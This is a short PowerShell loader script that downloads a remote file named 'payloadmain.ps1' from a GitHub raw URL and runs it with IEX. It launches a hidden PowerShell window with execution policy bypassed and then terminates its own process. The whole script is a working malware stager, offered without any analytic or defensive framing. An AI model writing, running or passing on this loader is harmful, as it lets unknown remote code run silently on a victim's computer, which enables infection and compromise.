# Create a new PowerShell process
$command = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EffortPeaked/gsdttsada/main/payloadmain.ps1');"
$scriptblock = [scriptblock]::Create($command)

# Start a new hidden PowerShell process with the specified command
Start-Process -FilePath PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `$ExecutionContext.InvokeCommand.Invoke($scriptblock)" -WindowStyle Hidden -PassThru

# Close the current PowerShell process
Stop-Process -Id $PID
